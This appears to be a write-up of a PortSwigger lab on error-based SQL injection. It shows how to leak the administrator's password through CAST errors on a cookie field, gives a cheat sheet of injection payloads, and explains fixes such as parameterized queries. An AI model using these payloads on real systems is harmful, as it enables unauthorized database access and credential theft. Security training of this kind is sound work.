# Visible Error-Based SQL Injection — PortSwigger Lab Walkthrough

**Lab:** Visible error-based SQL injection
**Difficulty:** Practitioner
**Status:** Solved ✅

---

## What this lab is about

This one's a classic error-based SQLi. The app sticks a `TrackingId` cookie straight into a SQL query without sanitizing it, and — even better for us — it doesn't bother hiding its database errors. So instead of guessing blind, we can just make the query blow up in a way that leaks data back to us in the error message itself.

Goal: grab the administrator's password and log in.

## The bug, in plain terms

Somewhere on the backend the query looks roughly like this:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = '<TrackingId>'
```

Since `TrackingId` comes straight from a cookie we control, and the app happily prints raw SQL errors to the page, we've got everything we need for error-based extraction.

## Walking through the exploit

**1. Find the injection point**

Fire up Burp, browse the app, and grab a request. You'll spot a cookie that looks something like:

```
Cookie: TrackingId=xyz
```

That's our target.

**2. Drop it into Repeater**

Send that request over to Repeater so we can mess with the cookie value and watch how the server reacts without re-browsing every time.

**3. Break it on purpose**

Tack a single quote onto the value:

```
xyz'
```

Send it. If the app throws a SQL error back at you, congrats — you've confirmed the input isn't being sanitized.

**4. Tidy up the query**

Comment out whatever comes after our injection so the rest of the original query doesn't get in the way:

```
xyz'--
```

Now we've got a clean slate to build on.

**5. Prove we can trigger a controlled error**

Here's the fun part. We use `CAST()` to force a type conversion that's guaranteed to fail — and Postgres/whatever's under the hood will often print the offending value right there in the error:

```
' AND 1=CAST((SELECT 'a') AS int)--
```

The full query effectively becomes:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = ''
AND 1=CAST((SELECT 'a') AS int)--
```

Trying to cast the letter `a` into an integer fails, and the resulting error message hands back the value it choked on. That's our proof of concept.

**6. Pull something real out of the `users` table**

Now swap the hardcoded `'a'` for an actual subquery:

```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Same idea — the database tries to convert a username into an int, fails, and spits the username back out in the error. In this lab that comes back as `administrator`, confirming the table and account exist.

**7. Go after the password**

Same trick, different column:

```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The password obviously isn't a valid integer either, so it fails the same way — and the error message hands it to us in plaintext.

**8. Log in**

Head to the login page, punch in `administrator` and the password you just pulled out of the error message, and you're in. Lab solved.

## Payload cheat sheet

| Purpose | Payload |
|---|---|
| Trigger a basic error | `'` |
| Close out the query cleanly | `'--` |
| Confirm CAST-based error injection works | `' AND 1=CAST((SELECT 'a') AS int)--` |
| Pull the admin username | `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` |
| Pull the admin password | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` |

## Why this actually works

Three things have to line up for this attack to land:

1. User input (the cookie, here) flows straight into a SQL query.
2. The app doesn't suppress its database error messages.
3. Those errors happen to include the value that caused the failure.

Take any one of those away and the attack stops working. Parameterize the query, or just stop showing raw DB errors to users, and this whole chain falls apart.

**Quick example:** if the DB holds `username = administrator` and `password = secret123`, running `SELECT password FROM users LIMIT 1` returns `secret123`. Feed that into `CAST('secret123' AS int)` and you'll get something like:

```
invalid input syntax for type integer: "secret123"
```

And there's your password, sitting right there in the error.

## Takeaways

- SQL injection isn't limited to URL params or form fields — cookies are fair game too.
- Verbose database errors are a real information-disclosure risk, not just a minor annoyance.
- `CAST()` is a handy way to coerce the database into leaking data through a failed conversion.
- Never let raw DB errors reach the client in production.

## How to actually fix this

The real fix is parameterized queries / prepared statements — full stop. Don't build SQL with string concatenation:

```sql
SELECT * FROM users WHERE username = '<user_input>'
```

Use bound parameters instead:

```sql
SELECT * FROM users WHERE username = ?
```

On top of that:

- Never expose detailed database errors to end users — log them server-side instead.
- Return generic, non-descriptive error messages to the client.
- Validate and sanitize all user-controlled input.
- Run the database account with the least privilege it can get away with.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't point this at anything you don't have permission to test.*
